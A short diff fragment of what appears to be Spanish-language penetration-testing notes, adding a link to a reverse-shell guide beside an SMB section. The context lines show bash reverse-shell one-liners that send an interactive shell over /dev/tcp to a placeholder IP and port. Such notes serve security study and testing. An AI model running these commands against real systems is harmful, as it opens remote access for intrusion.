@@ -36,6 +36,9 @@ Y luego usar alguno de los siguientes comandos
 > bash -i >& /dev/tcp/\<IP>/\<PORT> 0>&1
 
 > bash -c "bash -i >& /dev/tcp/\<IP>/\<PORT> 0>&1" ```
+ 
+
+* [Reverse Shell Guide](https://kb.systemoverlord.com/security/postex/reverse/) 
 
 #### SMB
 Dentro de una consola de smb, usando por ejemplo smbclient
